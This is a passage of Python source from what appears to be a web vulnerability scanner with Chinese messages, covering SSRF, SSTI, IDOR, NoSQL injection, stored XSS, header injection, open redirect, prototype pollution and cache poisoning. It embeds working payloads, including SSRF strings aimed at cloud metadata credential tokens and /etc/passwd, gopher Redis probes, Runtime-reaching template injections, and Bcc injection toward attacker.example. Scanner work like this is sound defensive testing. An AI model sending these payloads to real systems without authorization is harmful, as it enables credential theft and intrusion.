        "http://2852039166/latest/meta-data/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "http://169.254.169.254/metadata/instance?api-version=2019-06-01",
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
        "http://127.0.0.1:2375/version",
        "http://localhost:9200/",
        "http://127.0.0.1:8500/v1/agent/self",
        "http://127.1/", "http://0/", "http://[::1]/", "http://2130706433/",
        "http://0x7f000001/", "http://0177.0.0.1/", "http://127.0.0.1.nip.io/",
        "http://localtest.me/", "file:///etc/passwd", "file:///c:/windows/win.ini",
        "gopher://127.0.0.1:6379/_INFO", "dict://127.0.0.1:11211/stats",
        "//169.254.169.254/latest/meta-data/", "http://169.254.169.254.xip.io/latest/meta-data/",
    ]

    def _check_ssrf_cloud(self, url, context=None):
        parsed = urlparse(url)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        keys = list(qs.keys())
        if not keys:
            keys = ["url", "uri", "path", "dest", "redirect", "next", "link", "src", "image"]
            force = True
        else:
            force = False

        indicators = (
            "ami-id", "instance-id", "computeMetadata", "root:x:", "redis_version",
            "ApiVersion", "meta-data", "access_token", "security-credentials",
            "win.ini", "[fonts]", "Docker-Distribution-Api-Version",
        )
        vulns = []
        for key in keys[:5]:
            for payload in self._SSRF_BYPASS:
                try:
                    if force:
                        qs2 = {key: [payload]}
                    else:
                        qs2 = {k: list(v) for k, v in qs.items()}
                        qs2[key] = [payload]
                    test_url = urlunparse(parsed._replace(query=urlencode(qs2, doseq=True)))
                    headers = {}
                    if "google" in payload:
                        headers["Metadata-Flavor"] = "Google"
                    if "metadata/instance" in payload or "metadata/identity" in payload:
                        headers["Metadata"] = "true"
                    resp = self.http_client.get(test_url, headers=headers or None)
                    if not resp:
                        continue
                    body = (getattr(resp, "text", "") or "")[:2000]
                    if any(i in body for i in indicators):
                        vulns.append({
                            "type": "SSRF Cloud Metadata / Bypass", "severity": "critical",
                            "url": url, "parameter": key, "payload": payload,
                            "evidence": body[:200],
                            "description": "SSRF 通过绕过语料触达云元数据或内部服务",
                            "remediation": "阻止 link-local/元数据 IP，校验 URL scheme/host 白名单",
                        })
                        return vulns
                except Exception as e:
                    logger.debug(f"SSRF 云元数据: {e}")
        return vulns

    _SSTI_PROBES = [
        ("{{7*7}}", "49", "Jinja/Twig/Handlebars"),
        ("${7*7}", "49", "JSP/EL/FreeMarker"),
        ("<%=7*7%>", "49", "ERB/ASP"),
        ("${{7*7}}", "49", "Jinja2 expression"),
        ("#{7*7}", "49", "Pebble/Thymeleaf"),
        ("{{config.__class__}}", "config", "Jinja"),
        ("{{''.__class__.__mro__[1].__subclasses__()}}", "class", "Jinja"),
        ("<#assign x=7*7>${x}", "49", "FreeMarker"),
        ("${T(java.lang.Runtime).getRuntime()}", "java.lang.Runtime", "SpEL"),
        ("#set($x=7*7)$x", "49", "Velocity"),
        ("{% debug %}", "<class", "Django"),
    ]

    def _check_ssti_engines(self, url, context=None):
        parsed = urlparse(url)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            return []
        vulns = []
        for key in list(qs.keys())[:4]:
            for payload, expected, engine in self._SSTI_PROBES:
                try:
                    qs2 = {k: list(v) for k, v in qs.items()}
                    qs2[key] = [payload]
                    test_url = urlunparse(parsed._replace(query=urlencode(qs2, doseq=True)))
                    resp = self.http_client.get(test_url)
                    if not resp:
                        continue
                    body = getattr(resp, "text", "") or ""
                    status = getattr(resp, "status_code", 0)
                    has_expected = expected in body
                    literal_echo = payload in body
                    if has_expected and not literal_echo:
                        vulns.append({
                            "type": f"Server-Side Template Injection ({engine})", "severity": "critical",
                            "url": url, "parameter": key, "payload": payload,
                            "evidence": f"HTTP {status} – 求值结果 '{expected}' 出现在响应体",
                            "description": f"{engine} 模板表达式在服务端被求值，表明存在 SSTI，可导致 RCE",
                            "remediation": "使用沙箱模板引擎，避免将用户输入传入模板上下文，严格输出编码",
                        })
                        return vulns
                    if "7777777" in body and not literal_echo:
                        vulns.append({
                            "type": f"Server-Side Template Injection ({engine} – deep eval)", "severity": "critical",
                            "url": url, "parameter": key, "payload": payload,
                            "evidence": f"HTTP {status} – 深层求值结果 '7777777' 出现在响应体",
                            "description": f"{engine} 模板表达式被深层求值，支持嵌套表达式，可导致 RCE",
                            "remediation": "使用沙箱模板引擎，避免将用户输入传入模板上下文，严格输出编码",
                        })
                        return vulns
                except Exception as e:
                    logger.debug(f"SSTI 多引擎: {e}")
        return vulns

    _ID_RE = re.compile(r"(?<=[=/])(\d{1,12})(?=/|$|&|\?)")
    _UUID_RE = re.compile(r"(?<=[=/])([0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12})(?=/|$|&|\?)")
    _B64_RE = re.compile(r"(?<=[=/])([A-Za-z0-9+/]{8,}={0,2})(?=/|$|&|\?)")

    def _check_idor(self, url, context=None):
        vulns = []
        baseline = (context or {}).get("response")
        if baseline is None:
            baseline = self.http_client.get(url)
        if not baseline:
            return vulns
        base_status = getattr(baseline, "status_code", 0)
        base_body = getattr(baseline, "text", "") or ""
        base_len = len(base_body)
        if base_status not in (200, 201):
            return vulns

        for mut_url, param in self._mutate_ids(url)[:8]:
            try:
                resp = self.http_client.get(mut_url)
                if not resp:
                    continue
                st = getattr(resp, "status_code", 0)
                body = getattr(resp, "text", "") or ""
                ln = len(body)
                if st == 200 and abs(ln - base_len) > 50:
                    vulns.append({
                        "type": "Potential IDOR / BOLA", "severity": "high", "url": mut_url,
                        "parameter": param, "payload": mut_url,
                        "evidence": f"status={st} len={ln} vs 基线 len={base_len}",
                        "description": "对象 ID 交换后以 200 返回不同内容",
                        "remediation": "对每个请求强制执行对象级授权",
                    })
            except Exception as e:
                logger.debug(f"IDOR 探测失败: {e}")

        roles = (context or {}).get("alt_headers") or []
        for hdrs in roles[:2]:
            if not isinstance(hdrs, dict):
                continue
            try:
                resp = self.http_client.get(url, headers=hdrs)
                if not resp:
                    continue
                st = getattr(resp, "status_code", 0)
                body = getattr(resp, "text", "") or ""
                if st == 200 and abs(len(body) - base_len) > 80 and body != base_body:
                    vulns.append({
                        "type": "Potential IDOR via Role Header Swap", "severity": "high",
                        "url": url, "parameter": "headers", "payload": str(list(hdrs.keys())),
                        "evidence": f"alt role status={st} len={len(body)} vs {base_len}",
                        "description": "备用认证头返回了不同的对象数据",
                        "remediation": "将对象访问绑定到已认证主体，而非客户端提供的角色头",
                    })
            except Exception as e:
                logger.debug(f"IDOR 角色头: {e}")
        return vulns

    def _mutate_ids(self, url):
        out = []
        parsed = urlparse(url)
        for m in self._ID_RE.finditer(parsed.path):
            n = int(m.group(1))
            for delta in (1, -1, 2, 999, 1000):
                nn = max(1, n + delta)
                new_path = parsed.path[:m.start(1)] + str(nn) + parsed.path[m.end(1):]
                out.append((urlunparse(parsed._replace(path=new_path)), f"path:{m.group(1)}"))
        for m in self._UUID_RE.finditer(parsed.path + ("?" + parsed.query if parsed.query else "")):
            raw = m.group(1)
            try:
                last = int(raw[-1], 16)
                flipped = raw[:-1] + format((last + 1) % 16, "x")
            except Exception:
                continue
            if raw in parsed.path:
                new_path = parsed.path.replace(raw, flipped, 1)
                out.append((urlunparse(parsed._replace(path=new_path)), f"uuid:{raw[:8]}"))
            elif raw in parsed.query:
                out.append((urlunparse(parsed._replace(query=parsed.query.replace(raw, flipped, 1))), f"uuid:{raw[:8]}"))
        for m in self._B64_RE.finditer(parsed.path):
            tok = m.group(1)
            if len(tok) > 40:
                continue
            try:
                pad = "=" * (-len(tok) % 4)
                dec = base64.b64decode(tok + pad)
                if dec.isdigit() or (len(dec) <= 8 and dec.isalnum()):
                    alt = base64.b64encode(str(int(dec.decode() or "1") + 1).encode()).decode().rstrip("=")
                    new_path = parsed.path[:m.start(1)] + alt + parsed.path[m.end(1):]
                    out.append((urlunparse(parsed._replace(path=new_path)), f"b64:{tok[:8]}"))
            except Exception:
                pass
        qs = parse_qs(parsed.query, keep_blank_values=True)
        for key, vals in qs.items():
            if not vals:
                continue
            v = vals[0]
            if v.isdigit():
                n = int(v)
                for delta in (1, -1, 2, 999):
                    qs2 = {k: list(vv) for k, vv in qs.items()}
                    qs2[key] = [str(max(1, n + delta))]
                    out.append((urlunparse(parsed._replace(query=urlencode(qs2, doseq=True))), key))
            elif self._UUID_RE.fullmatch(v):
                try:
                    last = int(v[-1], 16)
                    flipped = v[:-1] + format((last + 1) % 16, "x")
                    qs2 = {k: list(vv) for k, vv in qs.items()}
                    qs2[key] = [flipped]
                    out.append((urlunparse(parsed._replace(query=urlencode(qs2, doseq=True))), key))
                except Exception:
                    pass
        return out

    _MONGO_OPERATORS = [
        {"$gt": ""}, {"$ne": ""}, {"$where": "1==1"}, {"$regex": ".*"},
        {"$exists": True}, {"$gt": None}, {"$ne": None},
        {"$or": [{"a": "a"}, {"b": "b"}]},
    ]
    _NOSQL_QUERY_PAYLOADS = [
        '{"$gt":""}', '{"$ne":""}', '{"$where":"1==1"}', '{"$regex":".*"}',
        '{"$exists":true}', "[$ne]=", "[$gt]=", "[$regex]=.*",
    ]
    _NOSQL_ERRORS = [
        "MongoError", "$err", "mongo", "MongoDB", "BSON", "ObjectId", "MongoClient",
        "pymongo", "mongoose", "DocumentNotFound", "CastError", "ValidationError", "BSONTypeError",
    ]

    def _check_nosql(self, url, context=None):
        vulnerabilities = []
        context = context or {}
        baseline = self._nosql_baseline(url)
        if baseline is None:
            return vulnerabilities
        vulnerabilities.extend(self._nosql_query(url, baseline))
        vulnerabilities.extend(self._nosql_json(url, baseline, context))
        return vulnerabilities

    def _nosql_baseline(self, url):
        try:
            response = self.http_client.get(url, timeout=self.timeout)
            if response is None:
                return None
            return {"status_code": response.status_code, "content_length": len(response.text), "text": response.text}
        except Exception as e:
            logger.debug(f"NoSQL 基线请求失败: {e}")
            return None

    def _nosql_query(self, url, baseline):
        vulnerabilities = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        if not params:
            return vulnerabilities
        for param_name in params:
            for payload in self._NOSQL_QUERY_PAYLOADS:
                injected_url = self._nosql_inject_query(url, param_name, payload)
                result = self._nosql_send_analyze(injected_url, baseline, param_name, payload)
                if result:
                    vulnerabilities.append(result)
                    break
            array_url = self._nosql_inject_array(url, param_name)
            if array_url:
                result = self._nosql_send_analyze(array_url, baseline, param_name, f"{param_name}[$ne]=")
                if result:
                    vulnerabilities.append(result)
        return vulnerabilities

    def _nosql_json(self, url, baseline, context):
        vulnerabilities = []
        fields = context.get("parameters", ["username", "password", "email", "id", "query"])
        for field in fields:
            for operator in self._MONGO_OPERATORS:
                payload_body = {field: operator}
                try:
                    response = self.http_client.post(url, json=payload_body, timeout=self.timeout)
                    if response is None:
                        continue
                    evidence = self._nosql_detect(response, baseline)
                    if evidence:
                        vulnerabilities.append({
                            "type": "NoSQL Injection", "severity": "high", "url": url,
                            "parameter": field, "payload": json.dumps(payload_body),
                            "evidence": evidence,
                            "description": f"通过 JSON body 参数 '{field}' 检测到 NoSQL 注入，可导致认证绕过或数据提取",
                            "remediation": "校验并净化所有用户输入，使用参数化查询或 ODM 方法防止操作符注入",
                        })
                        break
                except Exception as e:
                    logger.debug(f"NoSQL JSON body 测试错误: {e}")
        return vulnerabilities

    @staticmethod
    def _nosql_inject_query(url, param, payload):
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [payload]
        return urlunparse(parsed._replace(query=urlencode(params, doseq=True)))

    @staticmethod
    def _nosql_inject_array(url, param):
        parsed = urlparse(url)
        operator_param = f"{param}[$ne]"
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[operator_param] = [""]
        return urlunparse(parsed._replace(query=urlencode(params, doseq=True)))

    def _nosql_send_analyze(self, url, baseline, param, payload):
        try:
            response = self.http_client.get(url, timeout=self.timeout)
            if response is None:
                return None
            evidence = self._nosql_detect(response, baseline)
            if evidence:
                return {
                    "type": "NoSQL Injection", "severity": "high", "url": url,
                    "parameter": param, "payload": payload, "evidence": evidence,
                    "description": f"通过查询参数 '{param}' 检测到 NoSQL 注入，可导致认证绕过或数据提取",
                    "remediation": "净化查询参数并拒绝意外类型，对预期值使用白名单",
                }
        except Exception as e:
            logger.debug(f"NoSQL 请求错误: {e}")
        return None

    def _nosql_detect(self, response, baseline):
        indicators = []
        response_text = response.text.lower()
        for error in self._NOSQL_ERRORS:
            if error.lower() in response_text:
                indicators.append(f"命中错误信息: '{error}'")
        current_length = len(response.text)
        baseline_length = baseline["content_length"]
        if baseline_length > 0:
            diff_ratio = abs(current_length - baseline_length) / baseline_length
            if diff_ratio > 0.5 and current_length > baseline_length:
                indicators.append(f"响应体显著增大: {baseline_length} -> {current_length} 字节")
        if baseline["status_code"] in (401, 403) and response.status_code == 200:
            indicators.append(f"疑似认证绕过: 状态从 {baseline['status_code']} 变为 200")
        if indicators:
            return "; ".join(indicators)
        return None

    # ============================================================
    # 二次注入 / 参数解析 / 方法覆盖 / 业务逻辑深检测（移植自 deep-eye modules/）
    # ============================================================
    def _check_stored_xss(self, url, context=None):
        """二次/存储型 XSS：注入唯一 token 后重取 sink 检测持久化回显。"""
        vulnerabilities = []
        context = context or {}
        token = "deepeye_sxss_" + hashlib.md5(url.encode()).hexdigest()[:8]
        payloads = [
            f'<img src=x id="{token}" onerror=1>',
            f'"><svg/onload=1 id="{token}">',
            f"';alert(1)//{token}",
        ]
        parsed = urlparse(url)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        form_fields = ["comment", "message", "q", "search", "name", "content", "body", "title", "bio"]
        for form in context.get("forms") or []:
            if isinstance(form, dict):
                for inp in form.get("inputs") or []:
                    if isinstance(inp, dict) and inp.get("name"):
                        form_fields.append(str(inp["name"]))
        form_fields = list(dict.fromkeys(form_fields))

        for payload in payloads[:3]:
            if qs:
                for key in list(qs.keys())[:3]:
                    qs2 = {k: list(v) for k, v in qs.items()}
                    qs2[key] = [payload]
                    self.http_client.get(urlunparse(parsed._replace(query=urlencode(qs2, doseq=True))))
            for field in form_fields[:6]:
                try:
                    self.http_client.post(url, data={field: payload})
                except Exception:
                    pass
                try:
                    self.http_client.post(url, json={field: payload})
                except Exception:
                    pass

        sinks = [url]
        if context.get("url"):
            sinks.append(context["url"])
        base = f"{parsed.scheme}://{parsed.netloc}"
        for path in ("/comments", "/posts", "/feed", "/profile", "/search", "/messages"):
            sinks.append(base + path)
        for sink in list(dict.fromkeys(sinks))[:8]:
            resp = self.http_client.get(sink)
            if resp and token in (getattr(resp, "text", "") or ""):
                vulnerabilities.append({
                    "type": "Stored XSS (second-order)", "severity": "high", "url": sink,
                    "parameter": "", "payload": token,
                    "evidence": f"Marker {token} reflected in stored content at {sink}",
                    "description": "注入的 payload 被持久化并渲染",
                    "remediation": "对输出做上下文编码；净化存储的 HTML",
                })
                break
        return vulnerabilities

    _HPP_SENTINEL = "HPP_PROBE_42"

    def _check_hpp_pollution(self, url, context=None):
        """HTTP 参数污染：baseline/probe/polluted 差分检测重复参数解析差异。"""
        vulnerabilities = []
        context = context or {}
        parsed = urlparse(url)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            return vulnerabilities
        baseline = self.http_client.get(url)
        if not baseline:
            return vulnerabilities
        baseline_body = getattr(baseline, "text", "") or ""
        baseline_status = getattr(baseline, "status_code", 0)
        for param in list(qs.keys())[:5]:
            vals = qs[param]
            if not vals:
                continue
            original = vals[0]
            probe_qs = {k: list(v) for k, v in qs.items()}
            probe_qs[param] = [self._HPP_SENTINEL]
            probe_url = urlunparse(parsed._replace(query=urlencode(probe_qs, doseq=True)))
            probe = self.http_client.get(probe_url)
            if not probe:
                continue
            probe_body = getattr(probe, "text", "") or ""
            polluted_qs = {k: list(v) for k, v in qs.items()}
            polluted_qs[param] = [original, self._HPP_SENTINEL]
            polluted_url = urlunparse(parsed._replace(query=urlencode(polluted_qs, doseq=True)))
            polluted = self.http_client.get(polluted_url)
            if not polluted:
                continue
            polluted_body = getattr(polluted, "text", "") or ""
            polluted_status = getattr(polluted, "status_code", 0)
            if polluted_body != baseline_body:
                behavior = self._infer_hpp_behavior(polluted_body, probe_body, original, self._HPP_SENTINEL)
                vulnerabilities.append({
                    "type": "HTTP Parameter Pollution", "severity": "medium", "url": polluted_url,
                    "parameter": param, "payload": f"{param}={original}&{param}={self._HPP_SENTINEL}",
                    "evidence": f"status={polluted_status} behavior={behavior} len_baseline={len(baseline_body)} len_probe={len(probe_body)} len_polluted={len(polluted_body)}",
                    "description": f"重复参数 '{param}' 产生与基线不同的响应，后端可能按 {behavior} 解析重复项",
                    "remediation": "归一化参数解析（拒绝重复项或显式处理数组）",
                })
        return vulnerabilities

    @staticmethod
    def _infer_hpp_behavior(polluted_body, probe_body, original, sentinel):
        if original + sentinel in polluted_body or sentinel + original in polluted_body:
            return "concatenation"
        if f'["{original}", "{sentinel}"]' in polluted_body or f'["{sentinel}", "{original}"]' in polluted_body:
            return "array"
        if polluted_body == probe_body:
            return "last-wins"
        if original in polluted_body and sentinel not in polluted_body:
            return "first-wins"
        return "unknown"

    _OVERRIDE_HEADERS = ["X-HTTP-Method-Override", "X-HTTP-Method", "X-METHOD-OVERRIDE", "_method"]
    _OVERRIDE_METHODS = ["DELETE", "PATCH", "PUT"]
    _OVERRIDE_SUCCESS = {200, 201, 202, 204, 302, 303, 307, 308}

    def _check_http_method_override(self, url, context=None):
        """HTTP 方法覆盖绕过：真实受限方法被拒后用覆盖头在 GET/POST 上重放。"""
        vulnerabilities = []
        for method in self._OVERRIDE_METHODS:
            real = self._request_method(url, method)
            if not real:
                continue
            real_status = getattr(real, "status_code", 0)
            if real_status not in (405, 403, 501, 502):
                continue
            for carrier in ("GET", "POST"):
                for header in self._OVERRIDE_HEADERS:
                    resp = self._request_method(url, carrier, headers={header: method})
                    if not resp:
                        continue
                    status = getattr(resp, "status_code", 0)
                    if status in self._OVERRIDE_SUCCESS:
                        vulnerabilities.append({
                            "type": "HTTP Method Override Bypass", "severity": "high", "url": url,
                            "parameter": "method", "payload": f"{carrier} + {header}: {method}",
                            "evidence": f"Real {method} returned {real_status}; override via {carrier} with {header} returned {status}",
                            "description": f"端点拒绝了真实 {method} ({real_status}) 但通过 {header} 在 {carrier} 上接受并返回 {status}",
                            "remediation": "在应用层校验真实 HTTP 方法；勿信任 X-HTTP-Method-Override 类头",
                        })
                        return vulnerabilities
        return vulnerabilities

    def _request_method(self, url, method, headers=None):
        m = method.upper()
        if m == "GET":
            return self.http_client.get(url, headers=headers)
        if m == "POST":
            return self.http_client.post(url, data="", headers=headers)
        if m == "DELETE":
            return self.http_client.delete(url, headers=headers)
        if m == "PUT":
            return self.http_client.put(url, data="", headers=headers)
        if m == "PATCH":
            return self.http_client.patch(url, data="", headers=headers)
        return self.http_client.request(m, url, headers=headers)

    _MASS_ASSIGN_FIELDS = [
        ("role", "admin"), ("is_admin", "true"), ("is_superuser", "true"),
        ("admin", "true"), ("balance", "99999"), ("credit", "99999"),
    ]

    def _check_mass_assignment(self, url, context=None):
        """批量赋值：注入特权字段，回显特权值即判定命中。"""
        vulnerabilities = []
        for field, value in self._MASS_ASSIGN_FIELDS:
            for send in (lambda u: self.http_client.post(u, data={field: value}),
                         lambda u: self.http_client.post(u, json={field: value})):
                try:
                    resp = send(url)
                except Exception:
                    continue
                if not resp:
                    continue
                body = getattr(resp, "text", "") or ""
                if self._mass_assign_hit(body, field, value):
                    vulnerabilities.append({
                        "type": "Mass Assignment", "severity": "high", "url": url,
                        "parameter": field, "payload": f"{field}={value}",
                        "evidence": f"响应回显特权字段 {field}={value}",
                        "description": "后端接受并回显未授权的特权字段，可导致权限提升",
                        "remediation": "使用白名单绑定模型字段，拒绝未预期字段",
                    })
                    return vulnerabilities
        return vulnerabilities

    @staticmethod
    def _mass_assign_hit(body, field, value):
        low = body.lower()
        if field.lower() in ("role", "is_admin", "is_superuser", "admin") and '"admin"' in low:
            return True
        if f'"{field}"' in low and value.lower() in low:
            return True
        return False

    _PROTO_POLLUTION_PAYLOADS = [
        {"__proto__": {"isAdmin": True}},
        {"constructor": {"prototype": {"polluted": "true"}}},
        {"__proto__": {"polluted": "yes"}},
    ]
    _PROTO_INDICATORS = ("cannot read propert", "typeerror", "polluted", "internal server error",
                         "is not a function", "undefined is not")

    def _check_prototype_pollution(self, url, context=None):
        """原型污染：JSON 注入 __proto__/constructor.prototype，错误指示符命中。"""
        vulnerabilities = []
        for payload in self._PROTO_POLLUTION_PAYLOADS:
            try:
                resp = self.http_client.post(url, json=payload)
            except Exception as e:
                logger.debug(f"原型污染测试失败: {e}")
                continue
            if not resp:
                continue
            body = (getattr(resp, "text", "") or "").lower()
            if any(i in body for i in self._PROTO_INDICATORS):
                vulnerabilities.append({
                    "type": "Prototype Pollution", "severity": "high", "url": url,
                    "parameter": "", "payload": json.dumps(payload),
                    "evidence": f"错误指示符命中: {body[:200]}",
                    "description": "JSON 原型污染可能导致权限提升或 DoS",
                    "remediation": "拒绝 __proto__/constructor.prototype 键，冻结原型并净化 JSON 输入",
                })
                return vulnerabilities
        return vulnerabilities

    def _check_host_header_deep(self, url, context=None):
        """Host 头深检测：多向量（X-Forwarded-Host/X-Host/Forwarded 等）注入并检测回显。"""
        vulnerabilities = []
        evil = "evil-poison.example"
        parsed = urlparse(url)
        host = parsed.hostname or "target.local"
        vectors = [
            ("Host", evil),
            ("X-Forwarded-Host", evil),
            ("X-Host", evil),
            ("X-Original-URL", f"http://{evil}/"),
            ("X-Rewrite-URL", f"http://{evil}/"),
            ("Forwarded", f"host={evil}"),
            ("Host", f"{host}@{evil}"),
        ]
        for header, value in vectors:
            try:
                resp = self.http_client.get(url, headers={header: value})
            except Exception as e:
                logger.debug(f"Host 头深检测: {e}")
                continue
            if not resp:
                continue
            body = getattr(resp, "text", "") or ""
            headers_str = str(dict(resp.headers)).lower()
            if evil in body or evil in headers_str:
                sev = "high" if re.search(r"(forgot|reset|password|recovery)", url, re.IGNORECASE) else "medium"
                vulnerabilities.append({
                    "type": "Host Header Injection (deep)", "severity": sev, "url": url,
                    "parameter": header, "payload": value,
                    "evidence": f"{header}: {value} 反射回响应",
                    "description": "Host 头被不安全使用，可能导致缓存/密码重置投毒",
                    "remediation": "对 Host 头做白名单校验，使用绝对 URL",
                })
                break
        return vulnerabilities

    def _check_crlf_header_inject_deep(self, url, context=None):
        """CRLF 注入深检测：双重编码 + 自定义头注入，响应头回显标记即命中。"""
        vulnerabilities = []
        marker = "deep-eye-crlf"
        payloads = [
            f"%0d%0aX-Deep-Eye:{marker}",
            f"%0aX-Deep-Eye:{marker}",
            f"%250d%250aX-Deep-Eye:{marker}",
        ]
        targets = list(self._injection_targets(url, context)) or self._fallback_targets(url, context)
        for surface, param_name in targets:
            for payload in payloads[:3]:
                resp = self._inject_and_get(url, context, surface, param_name, payload)
                if not resp:
                    continue
                hdrs = str(dict(resp.headers)).lower()
                if marker in hdrs or marker in (getattr(resp, "text", "") or "").lower():
                    vulnerabilities.append({
                        "type": "CRLF Header Injection (deep)", "severity": "medium", "url": url,
                        "parameter": param_name, "payload": payload,
                        "evidence": f"响应头回显 {marker}",
                        "description": "CRLF 注入导致响应头操纵/响应拆分",
                        "remediation": "净化用户输入，去除换行字符",
                    })
                    return vulnerabilities
        return vulnerabilities

    _REDIRECT_PARAMS = ("url", "redirect", "next", "return", "returnurl", "redirect_uri",
                        "goto", "dest", "continue", "relaystate", "target", "out", "to", "link")
    _REDIRECT_PAYLOADS = ["//evil.example", "https://evil.example", "javascript:alert(1)",
                          "https:\\evil.example", "victim.com@evil.example"]

    def _check_open_redirect_deep(self, url, context=None):
        """开放重定向深检测：扩展参数名 + 混淆 payload（协议相对/JS/@ 混淆）。"""
        vulnerabilities = []
        targets = list(self._injection_targets(url, context)) or self._fallback_targets(url, context)
        markers = ("evil.example", "evil.com")
        for surface, param_name in targets:
            if not any(rk in param_name.lower() for rk in self._REDIRECT_PARAMS):
                continue
            for payload in self._REDIRECT_PAYLOADS:
                resp = self._inject_and_get(url, context, surface, param_name, payload, allow_redirects=False)
                if not resp:
                    continue
                st = getattr(resp, "status_code", 0)
                location = str(dict(getattr(resp, "headers", {}) or {}).get("Location", ""))
                body = (getattr(resp, "text", "") or "")[:1500].lower()
                hit = any(m in location for m in markers) or any(m in body for m in markers)
                if (st in (301, 302, 303, 307, 308) and hit) or ('location=' in body and hit) \
                        or ('meta http-equiv="refresh"' in body and hit):
                    vulnerabilities.append({
                        "type": "Open Redirect (deep)", "severity": "medium", "url": url,
                        "parameter": param_name, "payload": payload,
                        "evidence": f"status={st} Location={location[:120]}",
                        "description": "开放重定向（含混淆 payload）可用于钓鱼攻击",
                        "remediation": "对重定向 URL 做白名单校验",
                    })
                    break
        return vulnerabilities

    def _check_api_bola_deep(self, url, context=None):
        """API BOLA 深检测：/api/ 等路径 ID 递增突变，200 且内容差异明显即命中。"""
        vulnerabilities = []
        path = urlparse(url).path or ""
        if not re.search(r"(/api/|/v\d+/|/users?/|/accounts?/|/orders?/)", path):
            return vulnerabilities
        baseline = self.http_client.get(url)
        if not baseline:
            return vulnerabilities
        base_status = getattr(baseline, "status_code", 0)
        base_body = getattr(baseline, "text", "") or ""
        base_len = len(base_body)
        if base_status not in (200, 201):
            return vulnerabilities
        for mut_url, param in self._mutate_ids(url)[:10]:
            resp = self.http_client.get(mut_url)
            if not resp:
                continue
            st = getattr(resp, "status_code", 0)
            body = getattr(resp, "text", "") or ""
            if st == 200 and abs(len(body) - base_len) > 40 and body != base_body:
                vulnerabilities.append({
                    "type": "Potential API BOLA", "severity": "high", "url": mut_url,
                    "parameter": param, "payload": mut_url,
                    "evidence": f"status={st} len={len(body)} vs 基线 len={base_len}",
                    "description": "API 对象 ID 交换后以 200 返回不同内容（可能越权）",
                    "remediation": "对每个请求强制执行对象级授权",
                })
        return vulnerabilities

    _EMAIL_PAYLOADS = [
        "test@example.com%0ABcc:evil@attacker.example",
        "test@example.com%0ACc:evil@attacker.example",
        "test@example.com%0D%0AContent-Type:text/html",
        "test@example.com%00Bcc:evil@attacker.example",
    ]

    def _check_email_injection(self, url, context=None):
        """邮件头注入：仅在 contact/mail 类路径注入换行头并检测是否被接受。"""
        vulnerabilities = []
        if not re.search(r"(contact|mail|feedback|message|email|send)", url.lower()):
            return vulnerabilities
        targets = list(self._injection_targets(url, context)) or self._fallback_targets(url, context)
        reject_markers = ("invalid email", "malformed", "not a valid")
        for surface, param_name in targets:
            if not any(k in param_name.lower() for k in ("email", "mail", "to", "recipient", "message", "body", "contact")):
                continue
            for payload in self._EMAIL_PAYLOADS:
                resp = self._inject_and_get(url, context, surface, param_name, payload)
                if not resp:
                    continue
                st = getattr(resp, "status_code", 0)
                body = (getattr(resp, "text", "") or "").lower()
                if st in (200, 201, 202, 302) and not any(m in body for m in reject_markers):
                    vulnerabilities.append({
                        "type": "Email Header Injection", "severity": "medium", "url": url,
                        "parameter": param_name, "payload": payload,
                        "evidence": f"status={st}, 未拒绝注入的邮件头",
                        "description": "邮件头注入可被用于发送垃圾邮件/钓鱼",
                        "remediation": "净化邮件头，去除换行与空字节",
                    })
                    break
        return vulnerabilities

    _GRAPHQL_INTROSPECTION = '{"query":"{__schema{types{name}}}"}'

    def _check_graphql_deep(self, url, context=None):
        """GraphQL 深检测：introspection 暴露 + 批量查询。"""
        vulnerabilities = []
        try:
            resp = self.http_client.post(url, data=self._GRAPHQL_INTROSPECTION,
                                         headers={"Content-Type": "application/json"})
            if resp and "__schema" in (getattr(resp, "text", "") or ""):
                vulnerabilities.append({
                    "type": "GraphQL Introspection Enabled", "severity": "medium", "url": url,
                    "parameter": "", "payload": self._GRAPHQL_INTROSPECTION,
                    "evidence": "响应包含 __schema（introspection 未禁用）",
                    "description": "GraphQL introspection 暴露完整 schema",
                    "remediation": "生产环境禁用 introspection",
                })
            batch_payload = json.dumps([{"query": "{__typename}"}, {"query": "{__typename}"}])
            resp2 = self.http_client.post(url, data=batch_payload, headers={"Content-Type": "application/json"})
            if resp2 and (getattr(resp2, "text", "") or "").count("__typename") >= 2:
                vulnerabilities.append({
                    "type": "GraphQL Query Batching", "severity": "low", "url": url,
                    "parameter": "", "payload": batch_payload,
                    "evidence": "批量查询被接受（响应含多个 __typename）",
                    "description": "GraphQL 批量查询可被用于 DoS/暴力绕过速率限制",
                    "remediation": "禁用或限制批量查询，实施速率限制",
                })
        except Exception as e:
            logger.debug(f"GraphQL 深检测: {e}")
        return vulnerabilities

    def _check_cache_poisoning(self, url, context=None):
        """缓存投毒：未键控头 + cache-buster 注入，重取命中即判定。"""
        vulnerabilities = []
        headers_list = [
            {"X-Forwarded-Host": "evil-poison.example"},
            {"X-Original-URL": "/evil-poison"},
            {"X-Host": "evil-poison.example"},
        ]
        parsed = urlparse(url)
        sep = "&" if parsed.query else "?"
        for headers in headers_list:
            try:
                bust = f"{url}{sep}cb={int(time.time())}"
                resp = self.http_client.get(bust, headers=headers)
                if not resp:
                    continue
                resp2 = self.http_client.get(bust)
                if not resp2:
                    continue
                body = getattr(resp2, "text", "") or ""
                if "evil-poison" in body:
                    vulnerabilities.append({
                        "type": "Web Cache Poisoning", "severity": "medium", "url": url,
                        "parameter": list(headers.keys())[0], "payload": str(headers),
                        "evidence": f"注入头 {headers} 的内容被缓存并回显",
                        "description": "未键控头被缓存，可向其他用户投毒",
                        "remediation": "配置缓存键包含相关请求头",
                    })
                    return vulnerabilities
            except Exception as e:
                logger.debug(f"缓存投毒: {e}")
        return vulnerabilities

    _CACHE_DECEPTION_TRICKS = ["/.css", "%2f.css", "/;.css", "/..%2fstatic/app.css"]

